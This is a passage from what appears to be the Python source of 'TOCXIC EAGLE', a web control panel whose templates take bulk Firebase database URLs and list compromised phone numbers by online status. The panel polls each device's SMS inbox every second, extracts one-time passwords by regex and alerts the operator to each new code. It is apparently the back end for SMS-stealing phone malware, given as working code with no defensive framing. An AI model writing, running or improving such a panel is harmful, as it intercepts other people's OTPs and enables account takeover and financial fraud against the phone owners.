.my-fb-card .fb-info{flex:1;min-width:0}
.my-fb-card .fb-label{font-size:12px;font-weight:800;color:#065f46}
.my-fb-card .fb-hash{font-size:10px;color:#98a2b3;font-family:monospace;margin-top:2px}
.my-fb-card .fb-actions button{padding:10px 14px;font-size:12px;background:rgba(240,68,56,.1);
color:#b42318;border:none;border-radius:8px;font-weight:800;min-height:42px}
</style></head><body>

<div class="topbar">
<div class="brand"><span class="eagle">🦅</span>
<div><span class="name">TOCXIC EAGLE</span><span class="sub">PERSONAL OTP</span></div></div>
<div class="nav">
<a href="/" class="nav-link">🏠 Home</a>
<a href="/user" class="nav-link">📱 Numbers</a>
<a href="/otp" class="nav-link otp active">🔐 Personal OTP</a>
</div>
<div style="display:flex;align-items:center;gap:10px">
<button onclick="manualRefresh()" style="background:linear-gradient(135deg,#12b76a,#32d583);
color:#fff;border:none;width:42px;height:42px;border-radius:50%;font-size:18px">🔄</button>
<div class="conn loading" id="conn-badge"><span class="dot"></span><span id="conn-text">...</span></div>
</div>
</div>

<div class="container">
<div id="list-view">
<div class="fb-add-card">
<h3>➕ Add Your Firebase URL</h3>
<div class="fb-add-row">
<input id="fb-url" placeholder="https://xxx-default-rtdb.firebaseio.com"
onkeypress="if(event.key==='Enter')addFirebase()" type="url" autocomplete="off">
<button class="primary" id="add-btn" onclick="addFirebase()">Add</button>
<button class="gray" id="bulk-toggle" onclick="toggleBulk()">Bulk</button>
</div>
<div id="bulk-area" class="bulk-area">
<textarea id="fb-bulk" placeholder="Ek line me ek URL paste karo"></textarea>
<button onclick="bulkAdd()">📥 Import All</button>
</div>
<div id="add-msg" class="fb-msg"></div>
<div class="my-fb-list" id="my-fb-list"></div>
</div>

<div class="stats">
<div class="stat total"><div class="label">Total</div><div class="value" id="s-total">0</div></div>
<div class="stat online"><div class="label">Online</div><div class="value" id="s-online">0</div></div>
<div class="stat offline"><div class="label">Offline</div><div class="value" id="s-offline">0</div></div>
<div class="stat otp"><div class="label">OTP Rate</div><div class="value" id="s-otp">0%</div></div>
</div>
<div class="quick"><div class="info">📱 Numbers <b id="q-dev">0</b></div></div>
<div class="num-filter-bar">
<button class="num-filter-btn active" id="nf-all" onclick="setNumberFilter('all')">All <span class="cnt" id="nf-all-c">0</span></button>
<button class="num-filter-btn" id="nf-online" onclick="setNumberFilter('online')">🟢 Online <span class="cnt" id="nf-online-c">0</span></button>
<button class="num-filter-btn" id="nf-offline" onclick="setNumberFilter('offline')">🔴 Offline <span class="cnt" id="nf-offline-c">0</span></button>
</div>
<div id="loading-text" class="loading-text">
<span class="spinner"></span><span id="loading-msg">Add a firebase to start...</span>
</div>
<div id="list-content" class="hidden">
<div class="search-box"><input id="search-num" placeholder="🔎 Search" oninput="renderNumbers()"></div>
<div class="list-header"><h2>📱 Numbers</h2><span class="count" id="num-count">0</span></div>
<div id="num-list"></div>
</div>
</div>

<div id="inbox-view" class="hidden">
<div class="inbox-header">
<div class="inbox-top">
<a href="#" class="back-btn" onclick="event.preventDefault();backToList()">←</a>
<div style="flex:1">
<div class="inbox-num" id="inbox-num">+91 ------</div>
<div class="inbox-status" id="inbox-status"><span class="dot"></span><span id="inbox-status-text">Online</span></div>
</div>
</div>
<div class="inbox-meta">
<span>⚡ LIVE · auto 1s</span>
<span class="refresh-icon" onclick="loadInbox(true)">🔄</span>
</div>
<div class="filter-bar">
<button class="filter-btn" id="fb-10m" onclick="setFilter('10m')">⚡ 10 min</button>
<button class="filter-btn active" id="fb-recent" onclick="setFilter('recent')">🔥 24h</button>
<button class="filter-btn" id="fb-all" onclick="setFilter('all')">📜 All</button>
</div>
</div>
<div id="top-number-badge" class="top-number-badge hidden">
<div class="tn-icon">🏆</div>
<div class="tn-info">
<div class="tn-num" id="tn-num">-</div>
<div class="tn-count">Sabse zyada baar <span class="tn-highlight" id="tn-count-badge">0</span></div>
</div>
</div>
<div id="sms-container"></div>
</div>
</div>

<div id="toast" class="toast"></div>

<script>
const COOKIE_NAME = "tocxic_eagle_personal_fb_v70";
let myFbs = [], allNumbers = [], numbers = [], currentNum = null;
let refreshTimer = null, lastSig = '', lastInboxSig = '', allInboxMsgs = [];
let currentFilter = 'recent', currentNumberFilter = 'all';
let lastOtpSeen = '', notifAsked = false;

function getCookie(n){ const cs = document.cookie.split(';');
for(let c of cs){ c = c.trim(); if(c.indexOf(n+'=')===0){ try{ return JSON.parse(decodeURIComponent(c.substring(n.length+1))); } catch(e){ return []; } } }
return []; }
function setCookie(n, v, d){ const e = new Date(Date.now() + d*864e5).toUTCString();
document.cookie = n + '=' + encodeURIComponent(JSON.stringify(v)) + '; expires=' + e + '; path=/; SameSite=Lax'; }
function saveFbs(){ setCookie(COOKIE_NAME, myFbs, 365); }

function toast(t){ const e = document.getElementById('toast'); e.textContent = t;
e.classList.add('show'); setTimeout(()=>e.classList.remove('show'), 2500); }

function playSound(){ try{
const ctx = new (window.AudioContext||window.webkitAudioContext)();
[880,1100,880].forEach((f,i)=>{ const o = ctx.createOscillator(), g = ctx.createGain();
o.connect(g); g.connect(ctx.destination); o.frequency.value = f;
const t = ctx.currentTime + i*0.2; g.gain.setValueAtTime(0.2,t);
g.gain.exponentialRampToValueAtTime(0.001,t+0.18); o.start(t); o.stop(t+0.18); }); }catch(e){} }

function askNotif(){ if(notifAsked) return; notifAsked = true;
if('Notification' in window && Notification.permission === 'default') Notification.requestPermission(); }

function showOtpNotif(otp, from, msg){
toast('🔔 OTP: ' + otp + ' — ' + from); playSound();
if('Notification' in window && Notification.permission === 'granted'){
try{ const n = new Notification('🔔 OTP: ' + otp, { body: from + '\\n' + msg.slice(0,100), tag:'otp-'+otp });
setTimeout(()=>n.close(), 10000); }catch(e){} }
if(navigator.vibrate){ try{ navigator.vibrate([200,100,200,100,200]); }catch(e){} } }

async function checkConn(){
try{ const r = await fetch('/api/conn'); const d = await r.json();
const b = document.getElementById('conn-badge'), t = document.getElementById('conn-text');
if(d.mongo_connected){ b.className = 'conn online'; t.textContent = 'Live'; }
else { b.className = 'conn offline'; t.textContent = 'Off'; } }catch(e){} }

async function manualRefresh(){ toast('🔄 Refreshing...');
if(myFbs.length > 0) await loadNumbers(); }

function renderFbs(){ const box = document.getElementById('my-fb-list');
if(myFbs.length === 0){ box.innerHTML = ''; return; }
box.innerHTML = myFbs.map((fb, i) => '<div class="my-fb-card">' +
'<div class="fb-icon">🔥</div>' +
'<div class="fb-info"><div class="fb-label">Firebase #' + (i+1) + '</div>' +
'<div class="fb-hash">ID: ' + escapeHtml(fb.hash || 'hidden') + '</div></div>' +
'<div class="fb-actions"><button onclick="removeFb(' + i + ')">🗑 Remove</button></div></div>').join(''); }

function toggleBulk(){ const a = document.getElementById('bulk-area');
a.style.display = (a.style.display === 'block') ? 'none' : 'block'; }

async function addFirebase(){
const input = document.getElementById('fb-url');
let url = input.value.trim();
if(!url){ showMsg('❌ URL required','err'); return; }
if(!url.startsWith('http')) url = 'https://' + url;
url = url.replace(/\\/+$/, '');
if(!url.includes('firebase')){ showMsg('❌ Invalid firebase URL','err'); return; }
if(myFbs.some(f => f.url === url)){ showMsg('⚠️ Already added','err'); return; }
document.getElementById('add-btn').disabled = true;
showMsg('⏳ Adding...','ok');
try{ const r = await fetch('/api/otp/add', { method:'POST',
headers:{'Content-Type':'application/json'}, body: JSON.stringify({url}) });
const d = await r.json();
if(d.success){ myFbs.push({url, hash: d.hash || 'hidden'});
saveFbs(); input.value = ''; showMsg('✅ Added','ok'); renderFbs(); loadNumbers(); }
else showMsg('❌ ' + (d.error||'Error'),'err'); }
catch(e){ showMsg('❌ Network error','err'); }
document.getElementById('add-btn').disabled = false; }

async function bulkAdd(){
const txt = document.getElementById('fb-bulk').value.trim();
if(!txt){ showMsg('❌ Empty','err'); return; }
const urls = txt.split('\\n').map(l => l.trim()).filter(l => l.startsWith('http') || l.includes('firebase'));
if(!urls.length){ showMsg('❌ No valid URLs','err'); return; }
showMsg('⏳ Adding ' + urls.length + '...','ok');
let added = 0, skip = 0, fail = 0;
for(let i=0; i<urls.length; i++){
let url = urls[i].trim(); if(!url.startsWith('http')) url = 'https://' + url;
url = url.replace(/\\/+$/, '');
if(!url.includes('firebase')){ fail++; continue; }
if(myFbs.some(f => f.url === url)){ skip++; continue; }
try{ const r = await fetch('/api/otp/add', { method:'POST',
headers:{'Content-Type':'application/json'}, body: JSON.stringify({url}) });
const d = await r.json();
if(d.success){ myFbs.push({url, hash: d.hash || 'hidden'}); added++; } else fail++; }
catch(e){ fail++; }
showMsg('⏳ ' + (i+1) + '/' + urls.length,'ok'); }
saveFbs(); renderFbs();
document.getElementById('fb-bulk').value = '';
document.getElementById('bulk-area').style.display = 'none';
showMsg('✅ Added: ' + added + ' · Skip: ' + skip + ' · Fail: ' + fail,'ok');
loadNumbers(); }

function showMsg(t, type){ const e = document.getElementById('add-msg');
e.className = 'fb-msg ' + type; e.textContent = t;
if(type === 'ok') setTimeout(()=>{ if(e.textContent.includes('✅')) e.className = 'fb-msg'; }, 4000); }

function removeFb(i){ if(!confirm('Remove this firebase?')) return;
myFbs.splice(i, 1); saveFbs(); renderFbs();
if(myFbs.length === 0){ allNumbers = []; numbers = [];
document.getElementById('list-content').classList.add('hidden');
document.getElementById('loading-text').classList.remove('hidden');
document.getElementById('loading-msg').textContent = 'Add a firebase to start...'; }
else loadNumbers(); toast('✅ Removed'); }

function setNumberFilter(f){ currentNumberFilter = f;
document.getElementById('nf-all').classList.toggle('active', f==='all');
document.getElementById('nf-online').classList.toggle('active', f==='online');
document.getElementById('nf-offline').classList.toggle('active', f==='offline');
applyFilter(); renderNumbers(); }

function setFilter(f){ currentFilter = f;
document.getElementById('fb-10m').classList.toggle('active', f==='10m');
document.getElementById('fb-recent').classList.toggle('active', f==='recent');
document.getElementById('fb-all').classList.toggle('active', f==='all');
renderMessages(); }

function applyFilter(){
if(currentNumberFilter === 'online') numbers = allNumbers.filter(n => n.online === true);
else if(currentNumberFilter === 'offline') numbers = allNumbers.filter(n => n.online !== true);
else numbers = allNumbers.slice();
document.getElementById('num-count').textContent = numbers.length; }

async function loadNumbers(){
if(myFbs.length === 0){
document.getElementById('list-content').classList.add('hidden');
document.getElementById('loading-text').classList.remove('hidden');
document.getElementById('loading-msg').textContent = 'Add a firebase to start...';
return; }
document.getElementById('loading-text').classList.remove('hidden');
document.getElementById('loading-msg').innerHTML = '<span class="spinner"></span>Loading...';
try{ const r = await fetch('/api/otp/data', { method:'POST',
headers:{'Content-Type':'application/json'}, body: JSON.stringify({urls: myFbs.map(f => f.url)}) });
const d = await r.json();
if(!d.success){ document.getElementById('loading-msg').textContent = '❌ ' + (d.error||'Error'); return; }
allNumbers = d.numbers || [];
document.getElementById('s-total').textContent = d.total || 0;
document.getElementById('s-online').textContent = d.online || 0;
document.getElementById('s-offline').textContent = d.offline || 0;
document.getElementById('s-otp').textContent = (d.otp_rate || 0) + '%';
document.getElementById('q-dev').textContent = allNumbers.length;
document.getElementById('nf-all-c').textContent = allNumbers.length;
document.getElementById('nf-online-c').textContent = d.online || 0;
document.getElementById('nf-offline-c').textContent = d.offline || 0;
applyFilter();
document.getElementById('loading-text').classList.add('hidden');
document.getElementById('list-content').classList.remove('hidden');
const sig = allNumbers.length + '|' + (d.online||0) + '|' + currentNumberFilter;
if(sig !== lastSig){ lastSig = sig; renderNumbers(); } }
catch(e){ document.getElementById('loading-msg').textContent = '❌ Network error'; } }

function renderNumbers(){
const q = (document.getElementById('search-num').value || '').toLowerCase();
const box = document.getElementById('num-list');
const filtered = numbers.filter(n => !q || (n.number||'').toLowerCase().includes(q) ||
(n.device_name||'').toLowerCase().includes(q));
if(filtered.length === 0){ box.innerHTML = '<div class="empty">📭 No numbers</div>'; return; }
box.innerHTML = filtered.map(n => {
const isOn = n.online === true;
const isUnk = (n.number||'').startsWith('UNKNOWN-');
const iconCls = isUnk ? 'gray' : (isOn ? '' : 'red');
const badgeCls = isOn ? 'badge-online' : 'badge-offline';
const badgeTxt = isOn ? 'Online' : 'Offline';
const idx = numbers.indexOf(n);
return '<div class="num-card">' +
'<div class="num-icon ' + iconCls + '" onclick="openInboxAt(' + idx + ')">' + (isUnk ? '❓' : '📶') + '</div>' +
'<div class="num-info" onclick="openInboxAt(' + idx + ')">' +
'<div class="num-title">' + escapeHtml(n.number) + '</div>' +
'<div class="num-sub"><span class="pill">📨 ' + n.msg_count + ' SMS</span>' +
(n.otp_count > 0 ? '<span class="pill otp">🔑 ' + n.otp_count + ' OTP</span>' : '') + '</div></div>' +
'<div class="' + badgeCls + '" onclick="openInboxAt(' + idx + ')"><span class="dot"></span>' + badgeTxt + '</div>' +
'<div class="arrow">›</div></div>'; }).join(''); }

function openInboxAt(idx){ if(idx < 0 || idx >= numbers.length) return; openInbox(numbers[idx]); }

async function openInbox(n){
currentNum = n; lastInboxSig = ''; allInboxMsgs = []; lastOtpSeen = '';
currentFilter = 'recent';
document.getElementById('fb-10m').classList.remove('active');
document.getElementById('fb-recent').classList.add('active');
document.getElementById('fb-all').classList.remove('active');
askNotif();
document.getElementById('list-view').classList.add('hidden');
document.getElementById('inbox-view').classList.remove('hidden');
document.getElementById('inbox-num').textContent = n.number;
const statusEl = document.getElementById('inbox-status');
const statusTxt = document.getElementById('inbox-status-text');
if(n.online === true){ statusEl.className = 'inbox-status'; statusTxt.textContent = 'Online'; }
else { statusEl.className = 'inbox-status offline'; statusTxt.textContent = 'Offline'; }
document.getElementById('sms-container').innerHTML = '<div class="empty"><span class="spinner"></span> Loading...</div>';
await loadInbox(false);
if(refreshTimer) clearInterval(refreshTimer);
refreshTimer = setInterval(()=>loadInbox(false), 1000); }

function findTop(msgs){ const counter = {}, senders = new Set();
msgs.forEach(m => { for(const n of (m.from||'').match(/(?<!\\d)([6-9]\\d{9})(?!\\d)/g) || []) senders.add(n); });
msgs.forEach(m => { for(const n of (m.message||'').match(/(?<!\\d)([6-9]\\d{9})(?!\\d)/g) || []){
if(senders.has(n)) continue; if(n.startsWith('1800')||n.startsWith('1900')||n.startsWith('1991')) continue;
counter[n] = (counter[n]||0) + 1; } });
let top = null, cnt = 0;
for(const [n, c] of Object.entries(counter)) if(c > cnt){ top = n; cnt = c; }
return top ? {number: top, count: cnt} : null; }

function updateTopBadge(msgs){
const b = document.getElementById('top-number-badge');
const t = findTop(msgs);
if(t && t.count >= 2){
document.getElementById('tn-num').textContent = '📞 ' + t.number;
document.getElementById('tn-count-badge').textContent = t.count + ' bar';
b.classList.remove('hidden'); } else b.classList.add('hidden'); }

async function loadInbox(showLoader){
if(!currentNum) return;
if(showLoader) document.getElementById('sms-container').innerHTML = '<div class="empty"><span class="spinner"></span> Refreshing...</div>';
const c = new AbortController(); const tid = setTimeout(()=>c.abort(), 15000);
try{ const r = await fetch('/api/inbox?fb=' + encodeURIComponent(currentNum.firebase) +
'&id=' + encodeURIComponent(currentNum.device_id) + '&num=' + encodeURIComponent(currentNum.number),
{ signal: c.signal }); clearTimeout(tid);
const d = await r.json();
if(!d.success){ document.getElementById('sms-container').innerHTML = '<div class="empty">❌ ' + (d.error||'Error') + '</div>'; return; }
const msgs = d.messages || []; allInboxMsgs = msgs;
if(msgs.length > 0){ const newest = msgs[0];
const otp = newest.otp || extractOtp(newest.message);
const sig = (newest.timestamp||0) + '|' + otp + '|' + (newest.message||'').slice(0,40);
if(otp && sig !== lastOtpSeen){ lastOtpSeen = sig; showOtpNotif(otp, newest.from||'Unknown', newest.message||''); } }
const sig = msgs.map(m => (m.timestamp||0) + '|' + (m.message||'').slice(0,40)).join('#');
if(sig !== lastInboxSig){ lastInboxSig = sig; renderMessages(); }
}catch(e){ clearTimeout(tid); } }

function timeAgo(ts, now){
if(!ts) return ''; const d = now - ts;
if(d < 10) return 'अभी'; if(d < 60) return d + 's';
if(d < 3600) return Math.floor(d/60) + 'm'; if(d < 86400) return Math.floor(d/3600) + 'h';
return Math.floor(d/86400) + 'd'; }

function highlightPhones(t){ return t.replace(/(?<!\\d)([6-9]\\d{9})(?!\\d)/g, '<span class="phone-highlight">$1</span>'); }

function renderMessages(){
const box = document.getElementById('sms-container');
const now = Math.floor(Date.now()/1000);
let msgs = allInboxMsgs;
if(currentFilter === '10m') msgs = msgs.filter(m => (m.timestamp||0) >= now - 600);
else if(currentFilter === 'recent') msgs = msgs.filter(m => (m.timestamp||0) >= now - 86400);
msgs = [...msgs].sort((a,b) => (b.timestamp||0) - (a.timestamp||0)).slice(0, 60);
updateTopBadge(msgs);
if(!msgs.length){ box.innerHTML = '<div class="empty">📭 No SMS</div>'; return; }
box.innerHTML = '<div class="sms-list">' + msgs.map(m => {
const otp = m.otp || extractOtp(m.message);
let body = otp ? escapeHtml(m.message).replace(otp, '<span class="otp-highlight">' + otp + '</span>') : escapeHtml(m.message);
body = highlightPhones(body);
const copyBtn = otp ? '<button class="otp-copy-btn" onclick="copyOtp(\\'' + otp + '\\')">📋 Copy OTP ' + otp + '</button>' : '';
const ts = m.timestamp || 0; const isFresh = ts >= now - 120;
const cls = isFresh ? 'fresh' : (otp ? 'otp-item' : '');
const timeStr = m.date_string || fmtTime(ts);
const newB = isFresh ? '<span class="new-badge">NEW</span>' : '';
let typeB = '';
if(otp) typeB = '<span class="msg-type-badge otp">OTP</span>';
else if(/[6-9]\\d{9}/.test(m.message||'')) typeB = '<span class="msg-type-badge number">📞 NUM</span>';
return '<div class="sms-item ' + cls + '">' + typeB +
'<div class="sms-head"><div class="sender">' + escapeHtml(m.from||'Unknown') + ' ' + newB + '</div>' +
'<div style="text-align:right"><div class="sms-time ' + (isFresh?'fresh':'') + '">' + escapeHtml(timeStr) + '</div>' +
'<div class="time-ago ' + (isFresh?'fresh':'') + '">' + timeAgo(ts, now) + '</div></div></div>' +
'<div class="sms-body">' + body + '</div>' + copyBtn + '</div>'; }).join('') + '</div>'; }

function backToList(){
document.getElementById('inbox-view').classList.add('hidden');
document.getElementById('list-view').classList.remove('hidden');
if(refreshTimer){ clearInterval(refreshTimer); refreshTimer = null; }
currentNum = null; }

function extractOtp(text){ if(!text) return '';
const t = String(text);
let m = t.match(/(?:otp|one[- ]time|password|code|pin|verification|passcode)[^\\d]{0,30}(\\d{4,8})/i);
if(m) return m[1];
m = t.match(/(\\d{4,8})[^\\d]{0,30}(?:is your|otp|one[- ]time|code)/i);
if(m) return m[1]; m = t.match(/#(\\d{4,8})/); if(m) return m[1]; return ''; }

function fmtTime(ts){ if(!ts) return '';
try{ let t = parseInt(ts); if(t > 1e12) t = Math.floor(t/1000); if(t < 1e9) return String(ts);
const d = new Date(t*1000);
const opts = { timeZone:'Asia/Kolkata', hour12:true, day:'2-digit', month:'2-digit', year:'numeric', hour:'2-digit', minute:'2-digit' };
return d.toLocaleString('en-IN', opts).replace(',', ' |'); }catch(e){ return String(ts); } }

function copyOtp(c){ const done = ()=>toast('✅ Copied: ' + c);
if(navigator.clipboard) navigator.clipboard.writeText(c).then(done).catch(()=>{
const ta = document.createElement('textarea'); ta.value = c; document.body.appendChild(ta);
ta.select(); document.execCommand('copy'); ta.remove(); done(); }); }

function escapeHtml(s){ return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }

try{ const raw = getCookie(COOKIE_NAME) || [];
if(Array.isArray(raw)) myFbs = raw.map(x => typeof x === 'string' ? {url:x, hash:'hidden'} : x);
}catch(e){ myFbs = []; }

renderFbs(); checkConn();
if(myFbs.length > 0) loadNumbers();
setInterval(checkConn, 8000);
setInterval(()=>{ if(myFbs.length > 0 && !currentNum) loadNumbers(); }, 10000);
</script>
</body></html>"""


# ============================================================
# ADMIN DASHBOARD
# ============================================================
ADMIN_DASHBOARD_HTML = """<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>TOCXIC EAGLE — SUPER MASTER</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
<meta name="theme-color" content="#0F3CC9">
""" + ORBITRON + """
<style>""" + MOBILE_CSS + BRAND_CSS + """</style></head><body>

<div class="topbar">
<div class="brand"><span class="eagle">🦅</span>
<div><span class="name">TOCXIC EAGLE</span><span class="sub">SUPER MASTER 👑</span></div></div>
<div class="nav">
<a href="/admin/dashboard" class="nav-link active">📱 Numbers</a>
<a href="/firebases" class="nav-link">🔥 Firebases</a>
<a href="/admin/security" class="nav-link sec">🔒 Security</a>
</div>
<div style="display:flex;align-items:center;gap:10px">
<button onclick="manualRefresh()" style="background:var(--grad);color:#fff;border:none;
width:42px;height:42px;border-radius:50%;font-size:18px">🔄</button>
<div class="conn loading" id="conn-badge"><span class="dot"></span><span id="conn-text">...</span></div>
<a href="/logout" class="nav-link">Logout</a>
</div>
</div>

<div class="container">
<div id="list-view">
<div class="stats">
<div class="stat total"><div class="label">Total</div><div class="value" id="s-total">0</div></div>
<div class="stat online"><div class="label">Online</div><div class="value" id="s-online">0</div></div>
<div class="stat offline"><div class="label">Offline</div><div class="value" id="s-offline">0</div></div>
<div class="stat otp"><div class="label">OTP Rate</div><div class="value" id="s-otp">0%</div></div>
</div>
<div class="quick">
<div class="info">🔥 Firebases <b id="q-fb">0</b> · 📱 Numbers <b id="q-dev">0</b></div>
<div class="btns">
<button class="green" onclick="manualRefresh()">🔄 Refresh</button>
<a href="/firebases">⚙️ Manage</a>
</div>
</div>
<div class="num-filter-bar">
<button class="num-filter-btn active" id="nf-all" onclick="setNumberFilter('all')">All <span class="cnt" id="nf-all-c">0</span></button>
<button class="num-filter-btn" id="nf-online" onclick="setNumberFilter('online')">🟢 Online <span class="cnt" id="nf-online-c">0</span></button>
<button class="num-filter-btn" id="nf-offline" onclick="setNumberFilter('offline')">🔴 Offline <span class="cnt" id="nf-offline-c">0</span></button>
</div>
<div id="loading-text" class="loading-text">
<span class="spinner"></span><span id="loading-msg">Loading...</span>
<div class="progress-bar"><div class="progress-fill" id="prog-fill" style="width:0%"></div></div>
</div>
<div id="list-content" class="hidden">
<div class="search-box"><input id="search-num" placeholder="🔎 Search number / device" oninput="renderNumbers()"></div>
<div class="list-header">
<h2>📱 Numbers <span class="live-badge" id="live-badge" style="display:none"><span class="dot"></span>LIVE</span></h2>
<span class="count" id="num-count">0</span>
</div>
<div id="num-list"></div>
</div>
</div>

<div id="inbox-view" class="hidden">
<div class="inbox-header">
<div class="inbox-top">
<a href="#" class="back-btn" onclick="event.preventDefault();backToList()">←</a>
<div style="flex:1">
<div class="inbox-num" id="inbox-num">+91 ------</div>
<div class="inbox-status" id="inbox-status"><span class="dot"></span><span id="inbox-status-text">Online</span></div>
</div>
</div>
<div class="inbox-meta">
<span>⚡ LIVE · auto 1s · Latest 60 SMS</span>
<span class="refresh-icon" onclick="loadInbox(true)">🔄</span>
</div>
<div class="filter-bar">
<button class="filter-btn" id="fb-10m" onclick="setFilter('10m')">⚡ 10 min</button>
<button class="filter-btn active" id="fb-recent" onclick="setFilter('recent')">🔥 24h</button>
<button class="filter-btn" id="fb-all" onclick="setFilter('all')">📜 All</button>
</div>
</div>
<div id="top-number-badge" class="top-number-badge hidden">
<div class="tn-icon">🏆</div>
<div class="tn-info">
<div class="tn-num" id="tn-num">-</div>
<div class="tn-count">Sabse zyada baar <span class="tn-highlight" id="tn-count-badge">0</span></div>
</div>
</div>
<div id="sms-container"></div>
</div>
</div>

<div id="toast" class="toast"></div>

<script>
let allNumbers = [], numbers = [], currentNum = null;
let refreshTimer = null, lastSig = '', lastInboxSig = '', allInboxMsgs = [];
let currentFilter = 'recent', currentNumberFilter = 'all';
let lastOtpSeen = '', notifAsked = false;

function toast(t){ const e = document.getElementById('toast'); e.textContent = t;
e.classList.add('show'); setTimeout(()=>e.classList.remove('show'), 2500); }

function playSound(){ try{
const ctx = new (window.AudioContext||window.webkitAudioContext)();
[880,1100,880].forEach((f,i)=>{ const o = ctx.createOscillator(), g = ctx.createGain();
o.connect(g); g.connect(ctx.destination); o.frequency.value = f;
const t = ctx.currentTime + i*0.2; g.gain.setValueAtTime(0.2,t);
g.gain.exponentialRampToValueAtTime(0.001,t+0.18); o.start(t); o.stop(t+0.18); }); }catch(e){} }

function askNotif(){ if(notifAsked) return; notifAsked = true;
if('Notification' in window && Notification.permission === 'default') Notification.requestPermission(); }

function showOtpNotif(otp, from, msg){
toast('🔔 OTP: ' + otp + ' — ' + from); playSound();
if('Notification' in window && Notification.permission === 'granted'){
try{ const n = new Notification('🔔 OTP: ' + otp, { body: from + '\\n' + msg.slice(0,100), tag:'otp-'+otp });
setTimeout(()=>n.close(), 10000); }catch(e){} }
if(navigator.vibrate){ try{ navigator.vibrate([200,100,200,100,200]); }catch(e){} } }

async function manualRefresh(){ toast('🔄 Refreshing...');
try{ const r = await fetch('/api/refresh',{method:'POST'}); const d = await r.json();
if(d.success){ setTimeout(loadNumbers, 800); toast('✅ Triggered'); }
else toast('❌ ' + (d.error||'Failed')); } catch(e){ toast('❌ Network error'); } }

function setNumberFilter(f){ currentNumberFilter = f;
document.getElementById('nf-all').classList.toggle('active', f==='all');
document.getElementById('nf-online').classList.toggle('active', f==='online');
document.getElementById('nf-offline').classList.toggle('active', f==='offline');
applyFilter(); renderNumbers(); }

function setFilter(f){ currentFilter = f;
document.getElementById('fb-10m').classList.toggle('active', f==='10m');
document.getElementById('fb-recent').classList.toggle('active', f==='recent');
document.getElementById('fb-all').classList.toggle('active', f==='all');
renderMessages(); }

function applyFilter(){
if(currentNumberFilter === 'online') numbers = allNumbers.filter(n => n.online === true);
else if(currentNumberFilter === 'offline') numbers = allNumbers.filter(n => n.online !== true);
else numbers = allNumbers.slice();
document.getElementById('num-count').textContent = numbers.length; }

async function checkConn(){
try{ const r = await fetch('/api/conn'); const d = await r.json();
const b = document.getElementById('conn-badge'), t = document.getElementById('conn-text');
if(d.mongo_connected){ b.className = 'conn online'; t.textContent = 'Live'; }
else { b.className = 'conn offline'; t.textContent = 'Off'; } }catch(e){} }

async function loadNumbers(){
try{ const r = await fetch('/api/numbers'); const d = await r.json();
if(!d.success){ document.getElementById('loading-msg').textContent = '❌ ' + (d.error||'Error'); return; }
allNumbers = d.numbers || [];
document.getElementById('s-total').textContent = d.total;
document.getElementById('s-online').textContent = d.online;
document.getElementById('s-offline').textContent = d.offline;
document.getElementById('s-otp').textContent = d.otp_rate + '%';
document.getElementById('q-dev').textContent = allNumbers.length;
document.getElementById('q-fb').textContent = d.firebases_total || 0;
document.getElementById('nf-all-c').textContent = allNumbers.length;
document.getElementById('nf-online-c').textContent = d.online || 0;
document.getElementById('nf-offline-c').textContent = d.offline || 0;
if(d.progress){ const pct = d.progress.total > 0 ? Math.floor(d.progress.done/d.progress.total*100) : 0;
document.getElementById('prog-fill').style.width = pct + '%';
document.getElementById('loading-msg').textContent = 'Fetching ' + d.progress.done + '/' + d.progress.total + ' (' + pct + '%)...'; }
applyFilter();
if(allNumbers.length > 0){
document.getElementById('loading-text').classList.add('hidden');
document.getElementById('list-content').classList.remove('hidden');
const sig = allNumbers.length + '|' + d.online + '|' + currentNumberFilter;
if(sig !== lastSig){ lastSig = sig; renderNumbers(); } }
else { document.getElementById('loading-text').classList.remove('hidden');
document.getElementById('loading-msg').textContent = d.loading ? '⏳ Loading...' : '📭 No numbers'; }
}catch(e){ document.getElementById('loading-msg').textContent = '❌ Network error'; } }

function renderNumbers(){
const q = (document.getElementById('search-num').value || '').toLowerCase();
const box = document.getElementById('num-list');
const filtered = numbers.filter(n => !q || (n.number||'').toLowerCase().includes(q) ||
(n.device_name||'').toLowerCase().includes(q) || (n.fb_name||'').toLowerCase().includes(q));
if(filtered.length === 0){ box.innerHTML = '<div class="empty">📭 No numbers found</div>'; return; }
box.innerHTML = filtered.map(n => {
const isOn = n.online === true;
const isUnk = (n.number||'').startsWith('UNKNOWN-');
const iconCls = isUnk ? 'gray' : (isOn ? '' : 'red');
const badgeCls = isOn ? 'badge-online' : 'badge-offline';
const badgeTxt = isOn ? 'Online' : 'Offline';
const cardCls = isOn ? '' : 'offline';
const titleCls = isUnk ? 'unknown' : '';
const conf = n.confidence || 0;
let confB = '';
if(!isUnk && conf > 0) confB = '<span class="confidence-badge">✓ ' + conf + 'x</span>';
const idx = numbers.indexOf(n);
return '<div class="num-card ' + cardCls + '">' +
'<div class="num-icon ' + iconCls + '" onclick="openInboxAt(' + idx + ')">' + (isUnk ? '❓' : '📶') + '</div>' +
'<div class="num-info" onclick="openInboxAt(' + idx + ')">' +
'<div class="num-title ' + titleCls + '">' + escapeHtml(n.number) + ' ' + confB + '</div>' +
'<div class="num-sub"><span class="pill">📨 ' + n.msg_count + ' SMS</span>' +
(n.otp_count > 0 ? '<span class="pill otp">🔑 ' + n.otp_count + ' OTP</span>' : '') + '</div></div>' +
'<div class="card-actions"><button class="raw-btn" onclick="event.stopPropagation();openRawData(' + idx + ')" title="Raw Data">🔍</button></div>' +
'<div class="' + badgeCls + '" onclick="openInboxAt(' + idx + ')"><span class="dot"></span>' + badgeTxt + '</div>' +
'<div class="arrow">›</div></div>'; }).join(''); }

function openRawData(idx){ if(idx < 0 || idx >= numbers.length) return;
const n = numbers[idx];
const url = '/debug?fb=' + encodeURIComponent(n.firebase) + '&id=' + encodeURIComponent(n.device_id);
window.open(url, '_blank'); }

function openInboxAt(idx){ if(idx < 0 || idx >= numbers.length) return; openInbox(numbers[idx]); }

async function openInbox(n){
currentNum = n; lastInboxSig = ''; allInboxMsgs = []; currentFilter = 'recent'; lastOtpSeen = '';
askNotif();
document.getElementById('fb-10m').classList.remove('active');
document.getElementById('fb-recent').classList.add('active');
document.getElementById('fb-all').classList.remove('active');
document.getElementById('list-view').classList.add('hidden');
document.getElementById('inbox-view').classList.remove('hidden');
document.getElementById('inbox-num').textContent = n.number;
